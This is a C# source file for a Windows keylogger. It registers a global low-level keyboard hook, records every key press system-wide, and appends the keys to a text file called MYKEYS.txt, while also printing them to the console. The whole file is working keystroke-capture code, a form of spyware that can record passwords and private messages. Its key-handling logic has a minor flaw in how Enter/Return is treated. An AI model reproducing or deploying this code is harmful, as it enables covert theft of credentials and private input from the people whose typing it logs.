using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;//import of dlls
using System.Diagnostics;//used to build hooks
using System.Windows.Forms;//converting of keystrokes into readable keys
using System.IO;

namespace WindowsKeyReader
{
    class Program
    {
        //https://docs.microsoft.com/en-us/windows/desktop/winmsg/about-hooks
        private static int WH_KEYBOARD_LL = 13;//The WH_KEYBOARD_LL hook enables you to monitor keyboard input events about to be posted in a thread input queue.
        private static int WM_KEYDOWN = 0x0100;//https://docs.microsoft.com/en-us/windows/desktop/inputdev/wm-keydown
        private static IntPtr hook = IntPtr.Zero; //A read-only field that represents a pointer or handle that has been initialized to zero.
        private static LowLevelKeyboardProc proc = HookCallback;
        static void Main(string[] args)
        {
            hook = SetHook(proc);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        //ricus comment
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        string line ="";
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                try
                {
                    
                    ///////////////////////////////////////////////////////////////
                    using (Stream str = new FileStream(Application.StartupPath + "MYKEYS.txt", FileMode.Append, FileAccess.ReadWrite))
                    {
                        // Declare a StreamWriter object that can be used to write text data to the file;
                        if ((Convert.ToString((Keys)vkCode)).ToUpper() != "SPACE" && (Convert.ToString((Keys)vkCode)).ToUpper() != "ENTER")
                        {
                           // MessageBox.Show(Convert.ToString((Keys)vkCode));
                            using (StreamWriter writer = new StreamWriter(Application.StartupPath + "MYKEYS.txt", true))
                            {
                                
                                writer.Write(Convert.ToString((Keys)vkCode));
                            }
                        }
                        else if ((Convert.ToString((Keys)vkCode)).ToUpper() == "SPACE")
                        {
                         //   MessageBox.Show(Convert.ToString((Keys)vkCode));
                         
                            using (StreamWriter writer = new StreamWriter(Application.StartupPath + "MYKEYS.txt",true))
                            {
                                writer.Write(" ");
                            }
                        }
                        else if ((Convert.ToString((Keys)vkCode)).ToUpper() == "RETURN")
                        {
                            //MessageBox.Show(Convert.ToString((Keys)vkCode));
                            using (StreamWriter writer = new StreamWriter(Application.StartupPath + "MYKEYS.txt",true))
                            {
                                writer.WriteLine();
                            }
                        }
                        str.Close();
                    }
                }
                catch { }
                ////////////////////////////////////////////////////////////////
                Console.WriteLine((Keys)vkCode);
            }

            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]// handles memory management, input/output operations, and interrupts.
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
